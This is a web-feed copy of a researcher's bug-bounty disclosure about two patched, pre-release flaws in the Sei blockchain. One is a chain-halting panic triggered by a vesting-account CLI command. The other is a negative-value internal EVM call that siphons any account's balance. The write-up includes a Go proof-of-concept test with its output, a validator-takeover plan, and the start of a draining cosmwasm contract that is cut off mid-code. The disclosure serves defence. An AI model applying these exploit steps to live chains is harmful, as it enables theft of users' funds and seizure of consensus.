<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://usmannkhan.com/bug%20reports/2024/06/17/sei-bug-report.html">Original</a>
    <h1>Sei pays out $2M bug bounty</h1>
    
    <div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>In April 2024, I found and reported two critical bugs to <a href="https://www.sei.io/">Sei Network</a> concerning their layer-1 blockchain. One of these issues impacted the chain’s availability, and the other its integrity. The Sei Foundation awarded me $75,000 and $2,000,000 respectively for these reports.</p>

<p>Both issues were caught after the code had been audited, merged, and slated for release but <strong>before</strong> it was shipped to production. As a result, no funds were put at risk. If it had made it to mainnet, the funds at risk from issue 2 would have been the entire Sei token market cap, or about $1B USD mark to market.</p>

<h2 id="issue-1">Issue 1</h2>

<p>If exploited, the first issue would have caused the chain to halt.</p>

<p>The Sei Network is a “Cosmos chain”, meaning it leverages the Cosmos SDK for its blockchain application and uses a tendermint fork (well, actually, Sei’s own fork of a fork) for consensus. Cosmos applications operate on blocks, which contain transactions, which further contain individual messages. Each of these messages triggers a state transition. The Cosmos SDK is written in Go.</p>

<p>Cosmos uses go panics for error handling. Transaction runs out of gas? panic. Try to spend more coins than you have? panic. Invalid inputs? panic.</p>

<p>To handle this, transactions are run within a <a href="https://docs.cosmos.network/main/learn/advanced/runtx_middleware">recovery loop</a> called the <code>RunTx recovery middleware</code>. When Cosmos processes a block of transactions, the flow is kind of like this (heavily simplified).</p>

<div><div><pre><code><span>func</span> <span>ProcessBlock</span><span>(</span><span>chainState</span> <span>State</span><span>,</span> <span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
    <span>state</span><span>.</span><span>StartBlock</span><span>(</span><span>curBlock</span><span>)</span>
    <span>state</span><span>.</span><span>ProcessTxs</span><span>(</span><span>curBlock</span><span>)</span>
    <span>state</span><span>.</span><span>EndBlock</span><span>(</span><span>curBlock</span><span>)</span>
<span>}</span>

<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>StartBlock</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
    <span>for</span> <span>module</span> <span>:=</span> <span>s</span><span>.</span><span>GetModules</span><span>()</span> <span>{</span>
        <span>module</span><span>.</span><span>StartBlock</span><span>(</span><span>curBlock</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>ProcessTxs</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>error</span> <span>{</span>
    <span>defer</span> <span>func</span><span>()</span> <span>{</span>
        <span>if</span> <span>r</span> <span>:=</span> <span>recover</span><span>()</span> <span>{</span>
            <span>return</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>&#34;borked&#34;</span><span>)</span>
        <span>}</span>
    <span>}</span>
    <span>// process tx, panics are ok in this function</span>
<span>}</span>

<span>func</span> <span>(</span><span>s</span> <span>State</span><span>)</span> <span>EndBlock</span><span>(</span><span>curBlock</span> <span>Block</span><span>)</span> <span>{</span>
    <span>for</span> <span>module</span> <span>:=</span> <span>s</span><span>.</span><span>GetModules</span><span>()</span> <span>{</span>
        <span>module</span><span>.</span><span>EndBlock</span><span>(</span><span>curBlock</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>There’s some preprocessing to set up a block, transactions are safely processed within a recovery loop, and then there is some work to do at the end of a block. Every Cosmos <code>module</code> can specify its own start and end processing hooks too. These hooks are one type of <code>ABCI method</code>. Unfortunately, by default, ABCI methods are not run in a recovery loop. Woops! If you panic <em>there</em>, the program will simply crash.</p>

<p>I first learned of this Cosmos footgun from Trail of Bits’ fantastic <code>building-secure-contracts</code> repo. ref: <a href="https://github.com/crytic/building-secure-contracts/tree/master/not-so-smart-contracts/cosmos/abci_panic">https://github.com/crytic/building-secure-contracts/tree/master/not-so-smart-contracts/cosmos/abci_panic</a></p>

<p>Sei had a panic in one of its ABCI EndBlockers, which would have reliably halted the chain if the code was reached. Remediation would have required a hard fork.</p>

<p>While looking through all of the ABCI hooks in the Sei codebase for reachable panics, one stood out to me: <a href="https://github.com/sei-protocol/sei-chain/blob/49eb8b3d205d4a73c5e2b2bb3a433f886279028b/x/evm/module.go#L232">https://github.com/sei-protocol/sei-chain/blob/49eb8b3d205d4a73c5e2b2bb3a433f886279028b/x/evm/module.go#L232</a></p>

<div><div><pre><code><span>coinbaseAddress</span> <span>:=</span> <span>state</span><span>.</span><span>GetCoinbaseAddress</span><span>(</span><span>idx</span><span>)</span>
<span>balance</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>,</span> <span>denom</span><span>)</span>
<span>weiBalance</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>GetWeiBalance</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>)</span>
<span>if</span> <span>!</span><span>balance</span><span>.</span><span>Amount</span><span>.</span><span>IsZero</span><span>()</span> <span>||</span> <span>!</span><span>weiBalance</span><span>.</span><span>IsZero</span><span>()</span> <span>{</span>
    <span>if</span> <span>err</span> <span>:=</span> <span>am</span><span>.</span><span>keeper</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>SendCoinsAndWei</span><span>(</span><span>ctx</span><span>,</span> <span>coinbaseAddress</span><span>,</span> <span>coinbase</span><span>,</span> <span>balance</span><span>.</span><span>Amount</span><span>,</span> <span>weiBalance</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>panic</span><span>(</span><span>err</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The above code, at the end of every block, goes through each transaction and tries to empty the “coinbase address” of any tokens. The way this is done is first the coinbase address’s balance is retrieved via a call to <code>GetBalance</code> and then this resulting balance is transferred out by a call to <code>SendCoinsAndWei</code>.</p>

<p>What the coinbase address represents in Sei doesn’t matter here. What’s important is that it is a deterministic address, calculable in advance. The address is calculated as a function of a tx’s index in a block. So the first tx in a block always has a “coinbase address” of <code>sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv</code>, and so on.</p>

<p>The mistake here stems from the fact that cosmos chains have a notion of locked and unlocked balances. The <code>GetBalance</code> function called above returns the total of locked+unlocked funds. If, for example, the coinbase address has 42sei of locked funds and 1000sei of unlocked funds, the <code>GetBalance</code> call will report a total balance of 1042sei. However, because we can only transfer unlocked funds, the <code>SendCoinsAndWei</code> call will return an error if we call it with any number greater than 1000ei. When <code>SendCoinsAndWei</code> is called with an amount of 1042 sei, it will return an error and then we will reach the call to panic.</p>

<p>One way to end up with locked funds is via a vesting account. If, for example, I want to grant you one thousand tokens linearly over four years then I can create a vesting account and the unlocks are handled automatically by Cosmos. When creating a vesting account I can specify its address and any unused address will do. I don’t need the keys to it or anything.</p>

<p>Now we have all the pieces needed to reach an ABCI panic:</p>

<ul>
  <li>Create a vesting account at the <code>sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv</code> address with some tokens.</li>
  <li>Send an EVM tx to Sei to reach this code block.</li>
</ul>

<p>To create the vesting account all we have to do is run a command like  <code>seid tx vesting create-vesting-account sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv 1000000000000000usei 1800000000 --from my_account --fees 50000usei</code> from the seid CLI tool.</p>

<p>Once this command is executed and the vulnerable code is run, the coinbase balance will be greater than zero but not entirely transferable. The call to <code>GetBalance</code> will return the sum of locked and unlocked tokens. Calling <code>SendCoinsAndWei</code> with this sum will return an error, and a panic will be triggered. The application will crash and the chain will halt.</p>

<p>To fix the issue, the call to <code>GetBalance</code> was simply replaced with a call to <code>SpendableCoins</code>. Easy! For safety, later on the panic was removed entirely.</p>

<p>Fix: <a href="https://github.com/sei-protocol/sei-chain/pull/1586/files#diff-115be1725cca6393185395215fba9c7f1150801c7111c60fd6a65720db7a8808">https://github.com/sei-protocol/sei-chain/pull/1586/files#diff-115be1725cca6393185395215fba9c7f1150801c7111c60fd6a65720db7a8808</a></p>

<p>Timeline:</p>
<ul>
  <li>April 22, 2024: I create the report on Immunefi</li>
  <li>April 23, 2024: The Sei team merge a PR fixing the bug</li>
  <li>April 23, 2024: The Sei team confirm the report</li>
  <li>April 24, 2024: The Sei team send payment of $75,000</li>
</ul>

<h2 id="issue-2">Issue 2</h2>

<p>If exploited, the second issue would have allowed an attacker to freely transfer funds out of any account.</p>

<p>When browsing through the fix commit and subsequent changes made as a result of the previous issue, I noticed some interesting code at the junction of Sei’s Cosmos and Geth modules.</p>

<p>At this time the Sei team was just wrapping up their work on Sei V2. V2 introduced the EVM (Ethereum Virtual Machine) to Sei. Integrating the EVM into a system like Cosmos is a sensitive process. Neither of these systems were designed with the other’s compatibility in mind and trying to combine them is difficult. It’s easy to introduce subtle yet disastrous bugs to your blockchain when doing this.</p>

<p>In the fix PR for the previous issue, an unrelated bug was also patched in the evm account balance handling code. Looking at this file, I noticed that <code>SubBalance</code> and <code>AddBalance</code> had provisions for negative numbers:</p>

<div><div><pre><code><span>func</span> <span>(</span><span>s</span> <span>*</span><span>DBImpl</span><span>)</span> <span>SubBalance</span><span>(</span><span>evmAddr</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amt</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>,</span> <span>reason</span> <span>tracing</span><span>.</span><span>BalanceChangeReason</span><span>)</span> <span>{</span>
	<span>s</span><span>.</span><span>k</span><span>.</span><span>PrepareReplayedAddr</span><span>(</span><span>s</span><span>.</span><span>ctx</span><span>,</span> <span>evmAddr</span><span>)</span>
	<span>if</span> <span>amt</span><span>.</span><span>Sign</span><span>()</span> <span>==</span> <span>0</span> <span>{</span>
		<span>return</span>
	<span>}</span>
	<span>if</span> <span>amt</span><span>.</span><span>Sign</span><span>()</span> <span>&lt;</span> <span>0</span> <span>{</span>
		<span>s</span><span>.</span><span>AddBalance</span><span>(</span><span>evmAddr</span><span>,</span> <span>new</span><span>(</span><span>big</span><span>.</span><span>Int</span><span>)</span><span>.</span><span>Neg</span><span>(</span><span>amt</span><span>),</span> <span>reason</span><span>)</span>
		<span>return</span>
	<span>}</span>
    <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>Subtracting -x Sei tokens from an account is just redirected to be the same as adding +x. Similarly, adding -x Sei tokens to an account is redirected to the code for subtracting +x.</p>

<p>That’s interesting. I wonder, how are balance transfers handled in the EVM anyways?</p>

<div><div><pre><code><span>// Transfer subtracts amount from sender and adds amount to recipient using the given Db</span>
<span>func</span> <span>Transfer</span><span>(</span><span>db</span> <span>vm</span><span>.</span><span>StateDB</span><span>,</span> <span>sender</span><span>,</span> <span>recipient</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amount</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>{</span>
	<span>db</span><span>.</span><span>SubBalance</span><span>(</span><span>sender</span><span>,</span> <span>amount</span><span>,</span> <span>tracing</span><span>.</span><span>BalanceChangeTransfer</span><span>)</span>
	<span>db</span><span>.</span><span>AddBalance</span><span>(</span><span>recipient</span><span>,</span> <span>amount</span><span>,</span> <span>tracing</span><span>.</span><span>BalanceChangeTransfer</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>If one could slip a negative amount into <code>Transfer</code>, they could siphon Sei <em>from</em> an account rather than transferring Sei <em>to</em> an account.</p>

<p>What guards are there before we reach Transfer?</p>

<div><div><pre><code><span>// CanTransfer checks whether there are enough funds in the address&#39; account to make a transfer.</span>
<span>// This does not take the necessary gas in to account to make the transfer valid.</span>
<span>func</span> <span>CanTransfer</span><span>(</span><span>db</span> <span>vm</span><span>.</span><span>StateDB</span><span>,</span> <span>addr</span> <span>common</span><span>.</span><span>Address</span><span>,</span> <span>amount</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>bool</span> <span>{</span>
	<span>return</span> <span>db</span><span>.</span><span>GetBalance</span><span>(</span><span>addr</span><span>)</span><span>.</span><span>Cmp</span><span>(</span><span>amount</span><span>)</span> <span>&gt;=</span> <span>0</span>
<span>}</span>
</code></pre></div></div>

<p>Looks like an account can make transfers as long as it has more than the <code>amount</code> being transferred. Looks good so far. Say I want to steal 100sei; I’d need to send a transfer of -100sei. Well, even a 0sei balance is more than -100sei. So for negative amounts this check will always pass.</p>

<p>Of course, there may be even more checks prior to this. Or not. It’s a big codebase, I don’t know. Let’s just write the code and see what happens.</p>

<p>In SeiV2 there are three high level ways to trigger this EVM transfer code:</p>
<ul>
  <li>From EVM space, use a <code>CALL</code>, <code>CREATE</code> or <code>SELFDESTRUCT</code> opcode</li>
  <li>Send a top level EVM Message packaged in a transaction</li>
  <li>From cosmwasm space, send an internal EVM message</li>
</ul>

<p>If any of these routes allow transfers of negative value then we will be able to steal the entire unlocked balance from any account.</p>

<hr/>
<p>Right off the bat the first option will not work. The EVM uses 256 bit registers that we can set freely as opcode arguments but the state transition handling code for <code>CALL</code> and <code>CREATE</code> treat these as unsigned integers, so they are always positive. <code>SELFDESTRUCT</code> triggers transfers but doesn’t take a value argument.</p>

<hr/>
<p>The second option seems promising. We only need to construct a <code>MsgEVMTransaction</code> with negative value. However, Sei’s <code>MsgEVMTransaction</code> type uses the RLP encoding from Geth for the data field, which itself includes the <code>value</code> field. <code>value</code> is typed as a big int, which is a signed type and can be negative! Unfortunately there is no valid RLP encoding for a negative big int: when encoding, the sign information is discarded. When decoding, the output is always positive.</p>

<div><div><pre><code><span>// WriteBigInt encodes a big.Int as an RLP string.</span>
<span>// Note: Unlike with Encode, the sign of i is ignored.</span>
<span>func</span> <span>(</span><span>w</span> <span>EncoderBuffer</span><span>)</span> <span>WriteBigInt</span><span>(</span><span>i</span> <span>*</span><span>big</span><span>.</span><span>Int</span><span>)</span> <span>{</span>
	<span>w</span><span>.</span><span>buf</span><span>.</span><span>writeBigInt</span><span>(</span><span>i</span><span>)</span>
<span>}</span>
</code></pre></div></div>
<hr/>
<p>The third option uses yet another execution mode contained in Sei. Really Sei V2 has three modes of executing transactions:</p>
<ul>
  <li>Cosmos messages</li>
  <li>cosmwasm</li>
  <li>EVM</li>
</ul>

<p>Technically cosmwasm and EVM programs are both triggered by high level cosmos messages, but it’s worth considering them separately. Cosmos transactions contain messages that execute specific functions. For example a message might execute an action like “stake some coins” or “send some coins”. These functions are baked into the chain code and are not generally programmable by end users.</p>

<p>The community found this a bit limiting, so to add more flexibility cosmwasm was introduced to bring a web assembly environment to Cosmos. This enabled general-purpose smart contract programming by end users.</p>

<p>Finally, Sei V2 builds on both of these and adds a bespoke EVM environment to the mix. The way this is done is by linking to go-ethereum and adding hooks to connect the EVM state mutations to the underlying Cosmos system and storage.</p>

<p>So now in addition to the fixed functions that can be called by messages, we also have the ability to specify messages that “create a cosmwasm or EVM program” or “execute a cosmwasm or EVM program”. The cosmwasm (web assembly) module is well tested and widely used. Sei’s EVM integration is custom, only used by Sei, and brand new.</p>

<p>At the time of my report, a Cosmos message in Sei could bounce execution back and forth between these environments as much as it wants. One could, for example, send a transaction that contains a message to call a cosmwasm program, which then dispatches a cosmos message to send coins, receives its result and calls an EVM contract.</p>

<p>Calling an EVM smart contract from cosmwasm in SeiV2 is slightly different from making a top-level EVM call directly. To make a cosmwasm -&gt; EVM call we use one of the following “internal” message types instead of <code>MsgEVMTransaction</code>.</p>

<div><div><pre><code><span>type</span> <span>MsgInternalEVMCall</span> <span>struct</span> <span>{</span>
	<span>Sender</span> <span>string</span>
	<span>Value</span>  <span>*</span><span>github_com_cosmos_cosmos_sdk_types</span><span>.</span><span>Int</span>
	<span>To</span>     <span>string</span>
	<span>Data</span>   <span>[]</span><span>byte</span>
<span>}</span>

<span>type</span> <span>MsgInternalEVMDelegateCall</span> <span>struct</span> <span>{</span>
	<span>Sender</span>       <span>string</span>
	<span>CodeHash</span>     <span>[]</span><span>byte</span>
	<span>To</span>           <span>string</span>
	<span>Data</span>         <span>[]</span><span>byte</span>
	<span>FromContract</span> <span>string</span>
<span>}</span>
</code></pre></div></div>

<p>Remember, what we’re interested in is triggering a transfer with a negative <code>amount</code> or <code>value</code> (these terms are used interchangeably at times). Of these two internal call types, only <code>MsgInternalEVMCall</code> allows us to specify a value to go along with the call. And it’s a signed int!</p>

<p>To find out whether or not I could successfully use <code>MsgInternalEVMCall</code> to make a siphoning transfer I added the following test to Sei’s test suite and ran it.</p>

<div><div><pre><code><span>func</span> <span>TestNegativeTransfer</span><span>(</span><span>t</span> <span>*</span><span>testing</span><span>.</span><span>T</span><span>)</span> <span>{</span>
	<span>steal_amount</span> <span>:=</span> <span>int64</span><span>(</span><span>1</span><span>_000_000_000_000</span><span>)</span>

	<span>k</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>EvmKeeper</span>
	<span>ctx</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>NewContext</span><span>(</span><span>false</span><span>,</span> <span>tmtypes</span><span>.</span><span>Header</span><span>{})</span><span>.</span><span>WithBlockHeight</span><span>(</span><span>2</span><span>)</span>
	<span>attackerAddr</span><span>,</span> <span>attackerEvmAddr</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>MockAddressPair</span><span>()</span>
	<span>victimAddr</span><span>,</span> <span>victimEvmAddr</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>MockAddressPair</span><span>()</span>

	<span>// associate addrs</span>
	<span>k</span><span>.</span><span>SetAddressMapping</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>attackerEvmAddr</span><span>)</span>
	<span>k</span><span>.</span><span>SetAddressMapping</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>victimEvmAddr</span><span>)</span>

	<span>// mint some funds to victim</span>
	<span>amt</span> <span>:=</span> <span>sdk</span><span>.</span><span>NewCoins</span><span>(</span><span>sdk</span><span>.</span><span>NewCoin</span><span>(</span><span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>),</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)))</span>
	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>k</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>MintCoins</span><span>(</span><span>ctx</span><span>,</span> <span>types</span><span>.</span><span>ModuleName</span><span>,</span> <span>sdk</span><span>.</span><span>NewCoins</span><span>(</span><span>sdk</span><span>.</span><span>NewCoin</span><span>(</span><span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>),</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)))))</span>
	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>k</span><span>.</span><span>BankKeeper</span><span>()</span><span>.</span><span>SendCoinsFromModuleToAccount</span><span>(</span><span>ctx</span><span>,</span> <span>types</span><span>.</span><span>ModuleName</span><span>,</span> <span>victimAddr</span><span>,</span> <span>amt</span><span>))</span>

	<span>// construct attack payload</span>
	<span>val</span> <span>:=</span> <span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span><span>)</span><span>.</span><span>Mul</span><span>(</span><span>sdk</span><span>.</span><span>NewInt</span><span>(</span><span>steal_amount</span> <span>*</span> <span>-</span><span>1</span><span>))</span>
	<span>req</span> <span>:=</span> <span>&amp;</span><span>types</span><span>.</span><span>MsgInternalEVMCall</span><span>{</span>
		<span>Sender</span><span>:</span> <span>attackerAddr</span><span>.</span><span>String</span><span>(),</span>
		<span>Data</span><span>:</span>   <span>[]</span><span>byte</span><span>{},</span>
		<span>Value</span><span>:</span>  <span>&amp;</span><span>val</span><span>,</span>
		<span>To</span><span>:</span>     <span>victimEvmAddr</span><span>.</span><span>Hex</span><span>(),</span>
	<span>}</span>

	<span>// logging</span>
	<span>preAttackerBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
	<span>preVictimBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
	<span>t</span><span>.</span><span>Logf</span><span>(</span><span>&#34;</span><span>\n</span><span>PRE ATTACK</span><span>\n</span><span>Attacker Bal: %d</span><span>\n</span><span>Victim Bal: %d</span><span>\n</span><span>------</span><span>\b</span><span>&#34;</span><span>,</span> <span>preAttackerBal</span><span>,</span> <span>preVictimBal</span><span>)</span>

	<span>// EXECUTE ATTACK</span>
	<span>_</span><span>,</span> <span>err</span> <span>:=</span> <span>k</span><span>.</span><span>HandleInternalEVMCall</span><span>(</span><span>ctx</span><span>,</span> <span>req</span><span>)</span>
	<span>require</span><span>.</span><span>Nil</span><span>(</span><span>t</span><span>,</span> <span>err</span><span>)</span>

	<span>// post logging</span>
	<span>postAttackerBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>attackerAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
	<span>postVictimBal</span> <span>:=</span> <span>testkeeper</span><span>.</span><span>EVMTestApp</span><span>.</span><span>BankKeeper</span><span>.</span><span>GetBalance</span><span>(</span><span>ctx</span><span>,</span> <span>victimAddr</span><span>,</span> <span>k</span><span>.</span><span>GetBaseDenom</span><span>(</span><span>ctx</span><span>))</span><span>.</span><span>Amount</span><span>.</span><span>Int64</span><span>()</span>
	<span>t</span><span>.</span><span>Logf</span><span>(</span><span>&#34;</span><span>\n</span><span>POST ATTACK</span><span>\n</span><span>Attacker Bal: %d</span><span>\n</span><span>Victim Bal: %d</span><span>\n</span><span>------</span><span>\b</span><span>&#34;</span><span>,</span> <span>postAttackerBal</span><span>,</span> <span>postVictimBal</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>The output was:</p>

<div><div><pre><code><span>$ </span>go <span>test</span> <span>-v</span> <span>-timeout</span> 30s <span>-run</span> <span>&#34;^TestNegativeTransfer$&#34;</span> github.com/sei-protocol/sei-chain/x/evm/keeper
<span>===</span> RUN   TestNegativeTransfer
    evm_test.go:67: 
        PRE ATTACK
        Attacker Bal: 0
        Victim Bal: 1000000000000
        <span>------</span>
    evm_test.go:76: 
        POST ATTACK
        Attacker Bal: 1000000000000
        Victim Bal: 0
        <span>------</span>
<span>---</span> PASS: TestNegativeTransfer <span>(</span>0.00s<span>)</span>
PASS
ok      github.com/sei-protocol/sei-chain/x/evm/keeper  0.215s
</code></pre></div></div>

<p>Sure enough, we can send an internal EVM call from an attacker account to a victim account with a negative value and siphon out that value from the victim’s balance.</p>

<p>At this point all funds on the chain are at risk. An attacker could freely steal Sei tokens from centralized exchanges, cold wallets, etc. Given that Sei is trading at around a $1 billion market cap with &gt;$100M of daily volume between derivatives and spot, there is a lot of profit opportunity here.</p>

<p>But for fun, we can take this bug even further.</p>

<p>Cosmos chains operate on proof of stake consensus. For Sei, this means that the 50 validators with the most stake are responsible for producing and verifying new blocks on the chain. All 50 validators’ stakes are held in one account called the “bonded token pool”.</p>

<p>An attacker can become the #1 most powerful validator on the chain by simply stealing the balance of the bonded token pool, and staking that sum again themselves. When they do this the tokens are returned to the same account they stole them from.  If you create 50 accounts, and do this 50 times, you will own all of the top 50 validators and control the chain. Because the active validator set is recalculated at the end of every block in an ABCI method, this whole attack can be done in one block.</p>

<p>Under the tendermint consensus system, anyone with &gt;2/3rds stake can arbitrarily choose what blocks are canonical on the chain. At this point the chain is considered compromised and needs to be hard forked from before the attack. Some things the attacker can do include:</p>

<ul>
  <li>Censor anyone’s transactions. If someone tried to use this same exploit to steal coins back from the attacker, their transactions can be ignored and will never land in a block.</li>
  <li>Commit invalid state transitions. The attacker can use their 2/3rds stake to attest to whatever blocks they want, including ones with arbitrary information and proofs in the block header.</li>
  <li>Double spend coins.</li>
</ul>

<p>While the token theft mechanism is perfectly valid according to the chain’s code, certain types of faults like committing invalid blocks will be rejected by honest full nodes. These nodes will simply stop advancing their local chain in the face of a safety fault. But other attacks, like transaction censoring, are not detectable.</p>

<p>Light clients that only check validator proofs, like those used in IBC, will accept any of the attacker blocks.</p>

<p>Timeline:</p>
<ul>
  <li>April 23, 2024: I create the report on Immunefi</li>
  <li>April 24, 2024: The Sei team merge a PR fixing the bug</li>
  <li>April 24, 2024: The Sei team confirm the report</li>
  <li>May 22, 2024: The Sei team send payment of $2,000,000</li>
</ul>

<p>I’d like to thank the Sei Foundation for their commendable efforts in securing the Sei protocol. It is only due to their thoroughness in designing Sei’s security strategy that these bugs were able to be caught before the vulnerable code was deployed to mainnet. The issues described here are subtle and persisted through Sei’s internal code review and several external audits. However Sei has gone above and beyond, putting a large amount of resources towards setting up a public bug bounty program in their pursuit of defense in depth. In rapidly addressing and honestly rewarding these reports, the Sei Foundation has demonstrated their absolute commitment to protecting their users.</p>

<h2 id="appendix">Appendix</h2>

<p>Particularly attentive readers might notice that the test I added to confirm issue 2 is not actually an end to end proof of concept.</p>

<p>In the test I constructed a <code>MsgInternalEVMCall</code> directly. But in a real attack scenario we would have to create a cosmwasm contract compiled to webassembly, populate this struct from there, serialize it to JSON, and send it as a submessage from cosmwasm back to the main cosmos application which would construct the <code>MsgInternalEVMCall</code> for us.</p>

<p>These two scenarios are not identical. The JSON-&gt;Msg encoder and handler functions are both custom written by the Sei team and were skipped in my test. It is reasonable to wonder whether or not there they contain additional guards that might prevent the attack but were skipped in the test I made.</p>

<p>When submitting my report to Sei I was very confident that there were no such guards, as I had read all of the code many times at that point and knew it inside and out. But eventually I wanted to test stealing tokens from the bonded validator pool to take over the validator set. I ended up making a proper end to end proof of concept because I wasn’t sure whether or not the bonded token pool had any special status as an account, potentially with some sort of lock on its tokens, and wanted to test this.</p>

<p>The following cosmwasm contract exploits the bug and drains the bonded token pool.</p>
<div><div><pre><code><span>#[cfg(not(feature</span> <span>=</span> <span>&#34;library&#34;</span><span>))]</span>
<span>use</span> <span>cosmwasm_std</span><span>::</span><span>entry_point</span><span>;</span>
<span>use</span> <span>cosmwasm_std</span><span>::{</span>
    <span>BalanceResponse</span><span>,</span> <span>BankQuery</span><span>,</span> <span>CosmosMsg</span><span>,</span> <span>DepsMut</span><span>,</span> <span>Env</span><span>,</span> <span>Int256</span><span>,</span> <span>MessageInfo</span><span>,</span> <span>Reply</span><span>,</span> <span>Response</span><span>,</span> <span>StdError</span><span>,</span> <span>StdResult</span><span>,</span> <span>SubMsg</span><span>,</span> <span>CustomMsg</span>
<span>};</span>
<span>use</span> <span>cw_storage_plus</span><span>::</span><span>Item</span><span>;</span>
<span>use</span> <span>crate</span><span>::</span><span>msg</span><span>::</span><span>InstantiateMsg</span><span>;</span>
<span>use</span> <span>cosmwasm_schema</span><span>::</span><span>cw_serde</span><span>;</span>
<span>use</span> <span>serde</span><span>::{</span><span>Deserialize</span><span>,</span> <span>Serialize</span><span>};</span>
<span>use</span> <span>schemars</span><span>::</span><span>JsonSchema</span><span>;</span>

<span>#[cfg_attr(not(feature</span> <span>=</span> <span>&#34;library&#34;</span><span>),</span> <span>entry_point)]</span>
<span>pub</span> <span>fn</span> <span>instantiate</span><span>(</span>
    <span>_deps</span><span>:</span> <span>DepsMut</span><span>,</span>
    <span>_env</span><span>:</span> <span>Env</span><span>,</span>
    <span>_info</span><span>:</span> <span>MessageInfo</span><span>,</span>
    <span>_msg</span><span>:</span> <span>InstantiateMsg</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Response</span><span>,</span> <span>StdError</span><span>&gt;</span> <span>{</span>
    <span>Ok</span><span>(</span><span>Response</span><span>::</span><span>default</span><span>())</span>
<span>}</span>

<span>#[cfg_attr(not(feature</span> <span>=</span> <span>&#34;library&#34;</span><span>),</span> <span>entry_point)]</span>
<span>pub</span> <span>fn</span> <span>execute</span><span>(</span>
    <span>deps</span><span>:</span> <span>DepsMut</span><span>,</span>
    <span>_env</span><span>:</span> <span>Env</span><span>,</span>
    <span>_info</span><span>:</span> <span>MessageInfo</span><span>,</span>
    <span>msg</span><span>:</span> <span>ExecuteMsg</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Response</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span><span>,</span> <span>StdError</span><span>&gt;</span> <span>{</span>
    <span>match</span> <span>msg</span> <span>{</span>
        <span>ExecuteMsg</span><span>::</span><span>Attack</span><span>{}</span> <span>=&gt;</span> <span>{</span>
